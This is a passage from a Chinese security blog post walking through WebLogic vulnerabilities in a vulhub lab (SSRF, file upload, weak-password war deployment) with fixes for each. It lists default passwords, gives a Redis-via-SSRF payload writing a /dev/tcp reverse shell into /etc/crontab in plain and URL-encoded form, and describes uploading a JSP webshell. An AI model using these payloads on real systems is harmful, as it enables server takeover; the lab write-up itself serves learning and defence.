<h2 id="war后门文件部署-1"><a href="#war后门文件部署-1" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h2><h3 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>jboss后台管理页面存在弱口令，通过爆破可以获得账户密码登陆。然后可以在后台上传后门的war包。</p>
<h3 id="JBoss漏洞防护"><a href="#JBoss漏洞防护" class="headerlink" title="JBoss漏洞防护"></a>JBoss漏洞防护</h3><ul>
<li>开启jmx-console密码认证</li>
<li>删除jmx-console.war与web-console.war</li>
</ul>
<h1 id="WebLogic漏洞分析"><a href="#WebLogic漏洞分析" class="headerlink" title="WebLogic漏洞分析"></a>WebLogic漏洞分析</h1><h2 id="WebLogic简介"><a href="#WebLogic简介" class="headerlink" title="WebLogic简介"></a>WebLogic简介</h2><p>WebLogic是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。安装weblogic后默认会监听7001端口。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<p><strong>默认后台地址</strong><br><a href="http://localhost:7001/console/login/loginForm.jsp" target="_blank" rel="noopener">http://localhost:7001/console/login/loginForm.jsp</a></p>
<p><strong>常用账号密码</strong><br>用户名密码都为：weblogic、system、portaladmin、guest</p>
<p>要想尽量避免远程部署漏洞，删除远程部署页面</p>
<h2 id="反序列化漏洞-1"><a href="#反序列化漏洞-1" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>上面已经说过序列化和反序列化了，就是把java对象转化为字节序列或字节序列转化为java对象的过程。而程序员过滤代码不严格就造成了伤害。</p>
<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>对访问wls-wsat的资源进行访问控制。</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>Weblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<h3 id="漏洞测试-6"><a href="#漏洞测试-6" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>可以使用vulhub实验环境复现</p>
<p><strong>环境</strong><br>环境就是 一个公网上存在WebLogi服务，然后存在ssrf漏洞<br>有一个内网，部署了一台Redis服务器，IP为172.x.0.2 端口为6379<br>反弹shell需要自己的公网IP<br>所以需要俩公网，一个内网</p>
<p>检测网站是否有ssrf漏洞可以用脚本，也可以手动用bp抓包测试</p>
<p>这里直接知道存在ssrf漏洞</p>
<p>SSRF漏洞存在于<br>[<a href="http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp]" target="_blank" rel="noopener">http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp]</a></p>
<p><a href="/2019/05/10/中间件漏洞/ssrf-1.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/ssrf-1.png" alt="" title=""></a><br>这里需要用bp反复测试该漏洞，根据返回的信息不同，来判断端口开放的状态。</p>
<p>存在的IP地址时，返回这个`</p>
<p></p><p>An error has occurred<br><br>weblogic.uddi.client.structures.exception.XML_SoapException: The server at <a href="http://range.jasec.cn:7001/" target="_blank" rel="noopener">http://range.jasec.cn:7001/</a> returned a 404 error code &#40;Not Found&#41;.  Please ensure that your URL is correct, and the web service has deployed without error.`</p>
<p>operator修改为一个不存在的端口后，会返回<code>could not connect over HTTP to server</code><br><a href="/2019/05/10/中间件漏洞/端口不存在.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/端口不存在.png" alt="" title=""></a></p>
<p>如果访问的非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
<p>根据猪猪侠师傅介绍的《WebLogic SSRF 服务探测》<br><a href="/2019/05/10/中间件漏洞/ssrf-2.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/ssrf-2.png" alt="" title=""></a></p>
<p>通过错误不同，即可探测内网状态</p>
<p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
<p>这里给出已知内网及端口，所以用ssrf探测内网<a href="http://172.x.0.2:6379" target="_blank" rel="noopener">http://172.x.0.2:6379</a><br>返回以下内容时，说明内网连通<br><a href="/2019/05/10/中间件漏洞/ssrf-4.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/ssrf-4.png" alt="" title=""></a></p>
<p>然后<br>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.21.0.2/4444 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>
<p>再url编码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.21.0.2%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>换行符是“\r\n”，也就是“%0D%0A”</p>
</blockquote>
<p>将url编码后的字符串放在ssrf的域名后面让operator=<br>payload，发送以后可以看到返回页面有上面的信息。</p>
<p>然后用自己的公网监听端口<br>nc -l -p 端口</p>
<p>然后就getshell</p>
<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>一：</p>
<ul>
<li>将SearchPublicRegistries.jsp直接删除</li>
</ul>
<p>二：</p>
<ul>
<li><p>删除uddiexplorer文件夹</p>
</li>
<li><p>限制uddiexplorer应用只能内网访问</p>
</li>
</ul>
<p>三：</p>
<ul>
<li>Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。</li>
<li>或者采用改后缀的方式<br>1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份</li>
</ul>
<p>2）将weblogic安装目录下的server/lib/uddiexplorer.war下载</p>
<p>3）用winrar等工具打开uddiexplorer.war</p>
<p>4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx</p>
<p>5）保存后上传回服务端替换原先的uddiexplorer.war</p>
<p>6）对于多台主机组成的集群，针对每台主机都要做这样的操作</p>
<p>7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用–停server–停控制台–启控制台–启server–启应用）</p>
<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><p>访问config.do配置页面，先更改Work Home工作目录，用已经有效的已部署的web应用目录替换默认的存储JKS Keystores文件目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。</p>
<h3 id="漏洞测试-7"><a href="#漏洞测试-7" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>搭好漏洞环境后，访问访问<a href="http://192.168.1.15:7001/ws_utc/config.do" target="_blank" rel="noopener">http://192.168.1.15:7001/ws_utc/config.do</a></p>
<p><a href="/2019/05/10/中间件漏洞/文件上传-1.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/文件上传-1.png" alt="" title=""></a></p>
<p>然后<br>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限.</p>
<p>然后点 安全-&gt;添加  然后上传webshell<br><a href="/2019/05/10/中间件漏洞/文件上传-2.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/文件上传-2.png" alt="" title=""></a></p>
<p>可以看到我上传的东西<br><a href="/2019/05/10/中间件漏洞/文件上传-3.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/文件上传-3.png" alt="" title=""></a></p>
<p>上传一个xx.jsp 然后查看返回的数据包，里面有时间戳<br><a href="/2019/05/10/中间件漏洞/文件上传-6.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/文件上传-6.png" alt="" title=""></a><br>然后访问<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</span><br></pre></td></tr></table></figure></div></p>
<p>我的是：<br><a href="http://ip:7001/ws_utc/css/config/keystore/1558512499012_wang.jsp" target="_blank" rel="noopener">http://ip:7001/ws_utc/css/config/keystore/1558512499012_wang.jsp</a><br>访问以后执行webshell<br><a href="/2019/05/10/中间件漏洞/文件上传-5.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/文件上传-5.png" alt="" title=""></a></p>
<p><a href="/2019/05/10/中间件漏洞/文件上传-6.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/文件上传-6.png" alt="" title=""></a></p>
<blockquote>
<p>漏洞需要满足：1）需要知道部署应用的web目录；2）ws_utc/config.do在开发模式下无需认证，在生产模式下需要认证。具体可见Oracle® Fusion Middleware Administering Web Services</p>
</blockquote>
<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>方案1：</p>
<p>使用Oracle官方通告中的补丁链接：</p>
<p><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></p>
<p><a href="https://support.oracle.com/rs?type=doc&amp;id=2394520.1" target="_blank" rel="noopener">https://support.oracle.com/rs?type=doc&amp;id=2394520.1</a></p>
<p>方案2:</p>
<p>1）进入Weblogic Server管理控制台；</p>
<p>2）domain设置中，启用”生产模式”。</p>
<h2 id="war后门文件部署-2"><a href="#war后门文件部署-2" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h2><p>还是那个原因，后台存在弱口令，可直接登陆后台操作，上传war包。</p>
<p>访问ip/console，使用弱口令登陆，点击锁定并编辑，部署，安装，上传文件。</p>
<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Yogurt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dawangwangwang.github.io/2019/05/10/中间件漏洞/">https://dawangwangwang.github.io/2019/05/10/中间件漏洞/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://dawangwangwang.github.io">Yogurt</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/weixin.png" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/zhifubao.jpg" alt="支付寶"><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/05/15/缓存中间件/"><img class="prev_cover lazyload" data-src="/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>缓存中间件</span></div></a></div><div class="next-post pull_right"><a href="/2019/04/23/中间件/"><img class="next_cover lazyload" data-src="/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>中间件</span></div></a></div></nav></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2020 By Yogurt</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Hi,welcome to my blog!</div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/click_heart.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>